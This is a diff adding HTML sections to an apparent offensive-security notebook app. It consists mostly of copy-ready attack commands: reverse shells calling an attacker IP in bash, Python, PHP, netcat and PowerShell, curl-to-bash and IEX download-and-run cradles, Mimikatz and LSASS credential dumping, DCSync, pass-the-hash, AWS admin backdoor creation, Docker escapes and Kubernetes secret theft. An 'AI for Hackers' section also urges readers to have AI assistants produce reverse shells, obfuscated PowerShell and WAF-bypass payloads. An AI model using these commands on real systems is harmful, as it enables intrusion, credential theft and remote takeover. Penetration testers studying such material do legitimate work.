+        <div class="n-card" onclick="nShowSection('owasp-sqli')"><div class="n-card-title">💉 SQL Injection</div><div class="n-card-body">Union-based, error-based, blind SQLi, sqlmap usage, WAF bypass</div></div>
+        <div class="n-card" onclick="nShowSection('tools-pivot')"><div class="n-card-title">🔀 Pivoting</div><div class="n-card-body">SSH tunneling, chisel, ligolo-ng, proxychains setup, double pivots</div></div>
+        <div class="n-card" onclick="nShowSection('win-privesc')"><div class="n-card-title">👑 Windows PrivEsc</div><div class="n-card-body">SeImpersonatePrivilege, unquoted paths, AlwaysInstallElevated, potatoes</div></div>
+        <div class="n-card" onclick="nShowSection('cloud-docker')"><div class="n-card-title">🐳 Docker Escape</div><div class="n-card-body">Privileged container escape, socket mounts, cgroup release_agent</div></div>
+        <div class="n-card" onclick="nShowSection('extra-mimikatz')" style="border-color:rgba(124,58,255,0.3)"><div class="n-card-title" style="color:#7c3aff">🔑 Mimikatz Cheatsheet</div><div class="n-card-body">Full Mimikatz command reference, LSASS dumping, token manipulation</div></div>
+        <div class="n-card" onclick="nShowSection('extra-oscp')" style="border-color:rgba(255,58,110,0.3)"><div class="n-card-title" style="color:#ff3a6e">📋 OSCP Exam Tips</div><div class="n-card-body">Methodology, time management, reporting, and exam-day strategy</div></div>
+        <div class="n-card" onclick="nShowSection('extra-wireless')" style="border-color:rgba(0,229,255,0.3)"><div class="n-card-title" style="color:#00e5ff">📡 Wireless Attacks</div><div class="n-card-body">WPA2 cracking, PMKID, evil twin, deauth attacks, wireless recon</div></div>
+      </div>
+      <h2>Pentest Methodology Checklist</h2>
+      <ul class="n-checklist">
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Reconnaissance — passive &amp; active (OSINT, DNS, Shodan)</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Port scanning &amp; service enumeration (nmap, masscan)</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Vulnerability identification (searchsploit, CVE lookup)</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Exploitation &amp; initial foothold</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Shell stabilization &amp; persistence setup</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Post-exploitation enumeration (linpeas/winpeas)</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Privilege escalation → root/SYSTEM</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Credential harvesting (hashes, cleartext, tickets)</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Lateral movement &amp; pivoting</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Domain controller / cloud compromise</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Data exfiltration &amp; proof of impact</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Cleanup &amp; report documentation</li>
+      </ul>
+    </div>
+
+    <!-- ═══ AI TOOLS ═══ -->
+    <div id="n-sec-ai-tools" class="n-section">
+      <div class="n-page-title">🤖 <span class="hl">AI for Hackers</span></div>
+      <div class="n-page-sub">Using artificial intelligence to accelerate offensive security work</div>
+      <div class="n-info-box info"><strong>💡 Why AI in Offensive Security?</strong>AI tools dramatically speed up recon, payload crafting, log analysis, and CVE research. They don't replace skill — they amplify it. Use the AI assistant (purple button) to interact with Claude directly from this notebook.</div>
+      <h2>AI-Powered Security Tools</h2>
+      <div class="n-ai-tool-grid">
+        <div class="n-ai-tool-card"><span class="n-ai-tool-icon">🔍</span><div class="n-ai-tool-name">Recon &amp; OSINT</div><div class="n-ai-tool-desc">AI can summarize LinkedIn profiles, parse domain registration data, correlate emails/usernames across platforms, and identify attack surface from raw text.</div><div class="n-ai-tool-tags"><span class="n-ai-tag">OSINT</span><span class="n-ai-tag">Passive</span></div></div>
+        <div class="n-ai-tool-card"><span class="n-ai-tool-icon">💉</span><div class="n-ai-tool-name">Payload Generation</div><div class="n-ai-tool-desc">Ask AI to generate custom reverse shells, obfuscated PowerShell, SQLi payloads for specific DBs, XSS bypasses, or msfvenom one-liners for target environments.</div><div class="n-ai-tool-tags"><span class="n-ai-tag">Payloads</span><span class="n-ai-tag">Evasion</span></div></div>
+        <div class="n-ai-tool-card"><span class="n-ai-tool-icon">🔐</span><div class="n-ai-tool-name">Hash &amp; Crypto Analysis</div><div class="n-ai-tool-desc">Identify hash types, suggest cracking strategies, decode base64/hex, analyze JWT tokens, and understand crypto implementations for vulnerabilities.</div><div class="n-ai-tool-tags"><span class="n-ai-tag">Crypto</span><span class="n-ai-tag">Hashes</span></div></div>
+        <div class="n-ai-tool-card"><span class="n-ai-tool-icon">📋</span><div class="n-ai-tool-name">Log Analysis</div><div class="n-ai-tool-desc">Paste raw logs and ask AI to identify suspicious patterns, extract IOCs, parse access logs for LFI attempts, or analyze Windows event logs for lateral movement.</div><div class="n-ai-tool-tags"><span class="n-ai-tag">Forensics</span><span class="n-ai-tag">SOC</span></div></div>
+        <div class="n-ai-tool-card"><span class="n-ai-tool-icon">🐛</span><div class="n-ai-tool-name">CVE Research</div><div class="n-ai-tool-desc">Ask AI to explain CVE impact, identify affected versions, suggest detection bypasses, or help adapt public PoC exploits to specific targets.</div><div class="n-ai-tool-tags"><span class="n-ai-tag">Vulns</span><span class="n-ai-tag">PoC</span></div></div>
+        <div class="n-ai-tool-card"><span class="n-ai-tool-icon">📝</span><div class="n-ai-tool-name">Report Writing</div><div class="n-ai-tool-desc">Describe a finding and AI can draft professional pentest report sections with CVSS scoring, business impact analysis, and remediation recommendations.</div><div class="n-ai-tool-tags"><span class="n-ai-tag">Reports</span><span class="n-ai-tag">CVSS</span></div></div>
+      </div>
+      <h2>Useful AI Prompts for Pentesters</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Scenario</th><th>Prompt to use</th></tr>
+        <tr><td>Identify hash type</td><td><code>"What type of hash is this and how do I crack it: [HASH]"</code></td></tr>
+        <tr><td>Generate reverse shell</td><td><code>"Give me a Python3 reverse shell connecting to 10.10.10.10:4444"</code></td></tr>
+        <tr><td>Explain exploit</td><td><code>"Explain CVE-2021-4034 (PwnKit) step by step"</code></td></tr>
+        <tr><td>Decode base64</td><td><code>"Decode this base64 and tell me what it does: [DATA]"</code></td></tr>
+        <tr><td>Bypass WAF</td><td><code>"Give me SQLi payloads that bypass ModSecurity for MySQL"</code></td></tr>
+        <tr><td>Analyze log</td><td><code>"Find suspicious activity in this Apache access log: [LOG]"</code></td></tr>
+        <tr><td>AD attack path</td><td><code>"I compromised user 'jsmith' in domain CORP. What AD attacks should I try?"</code></td></tr>
+      </table></div>
+      <h2>OPSEC: AI Tool Risks</h2>
+      <div class="n-info-box warn"><strong>⚠️ OPSEC Warning</strong>Never paste client-specific data, real IPs, domain names, or sensitive credentials into public AI tools. Use local LLMs (Ollama, LM Studio) for sensitive engagements.</div>
+    </div>
+
+    <!-- ═══ LINUX LATERAL ═══ -->
+    <div id="n-sec-linux-lateral" class="n-section">
+      <div class="n-page-title">🐧 Linux <span class="hl">Lateral Movement</span></div>
+      <div class="n-page-sub">Post-exploitation commands for Linux environments</div>
+      <h2>System Enumeration</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>hostname && id && whoami
+uname -a && cat /etc/os-release
+cat /proc/version
+
+<span class="n-cm"># Network</span>
+ip a; ip route; arp -a
+ss -tulpn
+cat /etc/hosts
+
+<span class="n-cm"># Processes &amp; cron</span>
+ps aux --forest
+cat /etc/crontab && ls -la /etc/cron.*
+crontab -l</pre></div>
+      <h2>User Enumeration</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>cat /etc/passwd | grep -v nologin | grep -v false
+sudo -l
+find / -name "authorized_keys" 2>/dev/null
+find / -name "id_rsa" 2>/dev/null
+last; lastlog
+id; groups; cat /etc/group</pre></div>
+      <h2>File System</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>find / -perm -4000 -type f 2>/dev/null          <span class="n-cm"># SUID</span>
+find / -writable -type d 2>/dev/null            <span class="n-cm"># Writable dirs</span>
+find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+find / -newer /tmp -type f 2>/dev/null | grep -v proc</pre></div>
+      <h2>SSH Lateral Movement</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>ssh -i id_rsa user@target
+ssh -o StrictHostKeyChecking=no user@host
+
+<span class="n-cm"># Agent forwarding for multi-hop</span>
+ssh-add id_rsa
+ssh -A user@hop1 "ssh user@internal"</pre></div>
+    </div>
+
+    <!-- ═══ LINUX PRIVESC ═══ -->
+    <div id="n-sec-linux-privesc" class="n-section">
+      <div class="n-page-title">🐧 Linux <span class="hl">Privilege Escalation</span></div>
+      <div class="n-page-sub">Techniques to escalate from low-priv to root</div>
+      <div class="n-info-box tip"><strong>💡 First checks</strong>Always run <code>sudo -l</code>, check SUID, capabilities, cron jobs, and writable scripts first.</div>
+      <h2>Automated Enumeration</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && bash LinEnum.sh
+bash linux-exploit-suggester.sh</pre></div>
+      <h2>Sudo Abuse</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>sudo -l
+
+<span class="n-cm"># GTFOBins examples</span>
+sudo /bin/bash -p
+sudo vim -c ':!/bin/bash'
+sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo find . -exec /bin/bash \; -quit
+sudo less /etc/passwd      <span class="n-cm"># → !/bin/bash</span>
+sudo nmap --interactive    <span class="n-cm"># → !sh</span>
+
+<span class="n-cm"># LD_PRELOAD</span>
+gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so &lt;allowed_cmd&gt;</pre></div>
+      <h2>SUID Exploitation</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>find / -perm -u=s -type f 2>/dev/null
+/bin/bash -p
+./find . -exec /bin/sh -p \; -quit</pre></div>
+      <h2>Cron Job Abuse</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>cat /etc/crontab; ls -la /etc/cron.d/
+
+echo 'bash -i >&amp; /dev/tcp/10.10.10.10/4444 0>&amp;1' >> /path/cron.sh
+
+<span class="n-cm"># PATH hijacking</span>
+echo '/bin/bash -p' > /tmp/backup.sh && chmod +x /tmp/backup.sh</pre></div>
+      <h2>Capabilities</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>getcap -r / 2>/dev/null
+
+<span class="n-cm"># cap_setuid on python3</span>
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></div>
+      <h2>Kernel Exploits</h2>
+      <div class="n-info-box warn"><strong>⚠️ Warning</strong>Kernel exploits can crash the system. Use as last resort.</div>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>CVE</th><th>Name</th><th>Kernel</th></tr>
+        <tr><td><code>CVE-2021-4034</code></td><td>PwnKit (pkexec)</td><td>All</td></tr>
+        <tr><td><code>CVE-2021-3156</code></td><td>Baron Samedit (sudo)</td><td>All</td></tr>
+        <tr><td><code>CVE-2016-5195</code></td><td>Dirty COW</td><td>&lt; 4.8.3</td></tr>
+        <tr><td><code>CVE-2022-0847</code></td><td>Dirty Pipe</td><td>&lt; 5.16.11</td></tr>
+        <tr><td><code>CVE-2023-0386</code></td><td>OverlayFS SUID</td><td>&lt; 6.2</td></tr>
+      </table></div>
+    </div>
+
+    <!-- ═══ WIN AD ═══ -->
+    <div id="n-sec-win-ad" class="n-section">
+      <div class="n-page-title">🏰 Active <span class="hl">Directory</span></div>
+      <div class="n-page-sub">AD enumeration, attacks, and domain compromise</div>
+      <h2>Enumeration</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">powershell</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>net user /domain; net group /domain
+net group "Domain Admins" /domain
+
+<span class="n-cm"># PowerView</span>
+Get-Domain; Get-DomainController
+Get-DomainUser | select name,memberof,lastlogon
+Get-DomainGroup -Identity "Domain Admins" | select member
+Get-DomainComputer | select dnshostname,operatingsystem
+Find-LocalAdminAccess</pre></div>
+      <h2>BloodHound</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># From target (SharpHound)</span>
+.\SharpHound.exe -c All --zipfilename loot.zip
+
+<span class="n-cm"># From attacker (Python)</span>
+bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c All
+
+neo4j start && bloodhound</pre></div>
+      <h2>Kerberoasting</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>GetUserSPNs.py domain.local/user:pass -dc-ip 192.168.1.1 -request -outputfile hashes.kerberoast
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt</pre></div>
+      <h2>AS-REP Roasting</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>GetNPUsers.py domain.local/ -dc-ip 192.168.1.1 -no-pass -usersfile users.txt
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt</pre></div>
+      <h2>Pass-the-Hash</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>psexec.py -hashes :NTLM domain/Administrator@target
+wmiexec.py -hashes :NTLM domain/Administrator@target
+crackmapexec smb 192.168.1.0/24 -u user -H hash -x "whoami"</pre></div>
+      <h2>DCSync</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>secretsdump.py domain/admin:password@dc-ip
+secretsdump.py -just-dc-ntlm domain/admin:password@dc-ip</pre></div>
+    </div>
+
+    <!-- ═══ WIN LATERAL ═══ -->
+    <div id="n-sec-win-lateral" class="n-section">
+      <div class="n-page-title">🖼️ Windows <span class="hl">Lateral Movement</span></div>
+      <div class="n-page-sub">Moving through Windows environments post-compromise</div>
+      <h2>Enumeration</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">cmd</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>whoami /all && systeminfo
+net user && net localgroup administrators
+ipconfig /all && netstat -ano
+tasklist /svc && sc query</pre></div>
+      <h2>Remote Execution</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>evil-winrm -i target -u user -p password
+evil-winrm -i target -u user -H NTLM_HASH
+psexec.py user:pass@target
+xfreerdp /v:target /u:user /p:password /dynamic-resolution</pre></div>
+      <h2>Credential Dumping</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">powershell</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Mimikatz</span>
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::dcsync /user:Administrator
+
+<span class="n-cm"># LSASS dump</span>
+rundll32.exe C:\windows\System32\comsvcs.dll MiniDump PID C:\lsass.dmp full
+
+<span class="n-cm"># CrackMapExec</span>
+crackmapexec smb target -u admin -p pass --sam</pre></div>
+    </div>
+
+    <!-- ═══ WIN PRIVESC ═══ -->
+    <div id="n-sec-win-privesc" class="n-section">
+      <div class="n-page-title">🖼️ Windows <span class="hl">Privilege Escalation</span></div>
+      <div class="n-page-sub">From low-priv to SYSTEM/Administrator</div>
+      <h2>Automated Tools</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">powershell</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>.\winPEASx64.exe
+Import-Module .\PowerUp.ps1; Invoke-AllChecks
+.\Seatbelt.exe -group=all</pre></div>
+      <h2>Token Impersonation (SeImpersonatePrivilege)</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">powershell</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>whoami /priv   <span class="n-cm"># Look for SeImpersonatePrivilege</span>
+.\PrintSpoofer64.exe -i -c cmd
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\JuicyPotatoNG.exe -t * -p cmd.exe
+.\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe" -l 9999</pre></div>
+      <h2>Unquoted Service Path</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">cmd</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o program.exe</pre></div>
+      <h2>AlwaysInstallElevated</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">cmd</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi</pre></div>
+    </div>
+
+    <!-- ═══ AWS ═══ -->
+    <div id="n-sec-cloud-aws" class="n-section">
+      <div class="n-page-title">⛅ <span class="hl">AWS</span> Security</div>
+      <div class="n-page-sub">AWS enumeration and cloud exploitation</div>
+      <h2>Enumeration</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>aws sts get-caller-identity
+aws s3 ls && aws s3 ls s3://bucket --recursive
+aws iam get-user && aws iam list-users && aws iam list-roles
+aws ec2 describe-instances
+
+<span class="n-cm"># IMDS from inside EC2</span>
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</pre></div>
+      <h2>Privilege Escalation</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>aws iam create-user --user-name hacker
+aws iam attach-user-policy --user-name hacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam create-access-key --user-name hacker</pre></div>
+    </div>
+
+    <!-- ═══ DOCKER ═══ -->
+    <div id="n-sec-cloud-docker" class="n-section">
+      <div class="n-page-title">🐳 <span class="hl">Docker</span> Escape</div>
+      <div class="n-page-sub">Container enumeration and breakout techniques</div>
+      <h2>Container Check</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>cat /proc/1/cgroup | grep docker
+ls /.dockerenv
+cat /proc/self/status | grep CapEff    <span class="n-cm"># 0000003fffffffff = privileged</span></pre></div>
+      <h2>Docker Socket Escape</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>ls /var/run/docker.sock
+docker -H unix:///var/run/docker.sock run -it --privileged \
+  --pid=host --net=host --userns=host \
+  -v /:/mnt alpine chroot /mnt /bin/sh</pre></div>
+      <h2>Privileged Container</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>fdisk -l
+mkdir /mnt/host && mount /dev/sda1 /mnt/host
+chroot /mnt/host /bin/bash</pre></div>
+    </div>
+
+    <!-- ═══ K8S ═══ -->
+    <div id="n-sec-cloud-k8s" class="n-section">
+      <div class="n-page-title">⛅ <span class="hl">Kubernetes</span></div>
+      <div class="n-page-sub">K8s enumeration and privilege escalation</div>
+      <h2>Enumeration from Pod</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER=https://kubernetes.default.svc
+
+curl $APISERVER/api/v1/namespaces --header "Authorization: Bearer $TOKEN" --insecure
+curl $APISERVER/api/v1/secrets --header "Authorization: Bearer $TOKEN" --insecure
+
+kubectl get pods --all-namespaces
+kubectl auth can-i --list</pre></div>
+    </div>
+
+    <!-- ═══ FILE TRANSFERS ═══ -->
+    <div id="n-sec-tools-filetransfer" class="n-section">
+      <div class="n-page-title">⚒️ <span class="hl">File Transfers</span></div>
+      <div class="n-page-sub">Moving files between attacker and target systems</div>
+      <h2>Linux Downloads</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>python3 -m http.server 8080
+wget http://10.10.10.10:8080/file.sh
+curl http://10.10.10.10:8080/shell.sh | bash
+scp -i id_rsa file user@target:/tmp/</pre></div>
+      <h2>Windows Downloads</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">powershell</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>IEX(New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')
+Invoke-WebRequest -Uri http://IP/file.exe -OutFile C:\file.exe
+certutil -urlcache -f http://IP/file.exe file.exe
+bitsadmin /transfer job http://IP/file.exe C:\file.exe
+
+<span class="n-cm"># SMB share (attacker side)</span>
+impacket-smbserver share $(pwd) -smb2support</pre></div>
+      <h2>Base64 Transfer</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>base64 -w 0 file.exe
+echo "BASE64..." | base64 -d > file.exe
+certutil -decode encoded.txt file.exe        <span class="n-cm"># Windows decode</span></pre></div>
+    </div>
+
+    <!-- ═══ SHELLS ═══ -->
+    <div id="n-sec-tools-shells" class="n-section">
+      <div class="n-page-title">💀 <span class="hl">Shells &amp; Payloads</span></div>
+      <div class="n-page-sub">Reverse shells, bind shells, and payload generation</div>
+      <h2>Listener Setup</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>rlwrap nc -lvnp 4444
+socat file:`tty`,raw,echo=0 tcp-listen:4444    <span class="n-cm"># Full TTY listener</span></pre></div>
+      <h2>Reverse Shell One-liners</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Bash</span>
+bash -i >&amp; /dev/tcp/10.10.10.10/4444 0>&amp;1
+
+<span class="n-cm"># Python3</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+<span class="n-cm"># PHP</span>
+php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'
+
+<span class="n-cm"># Netcat (mkfifo)</span>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.10.10 4444 >/tmp/f
+
+<span class="n-cm"># PowerShell</span>
+powershell -nop -w hidden -c "$cl=New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$st=$cl.GetStream();[byte[]]$by=0..65535|%{0};while(($i=$st.Read($by,0,$by.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($by,0,$i);$s=(iex $d 2>&amp;1|Out-String);$sb=$s+'PS '+(pwd).Path+'> ';$se=([text.encoding]::ASCII).GetBytes($sb);$st.Write($se,0,$se.Length)};$cl.Close()"</pre></div>
+      <h2>Shell Stabilization</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Method 1: Python PTY</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+<span class="n-cm"># Ctrl+Z → stty raw -echo; fg → export TERM=xterm</span>
+
+<span class="n-cm"># Method 2: script</span>
+script /dev/null -c bash
+
+<span class="n-cm"># Method 3: socat full TTY (target)</span>
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</pre></div>
+      <h2>msfvenom Payloads</h2>
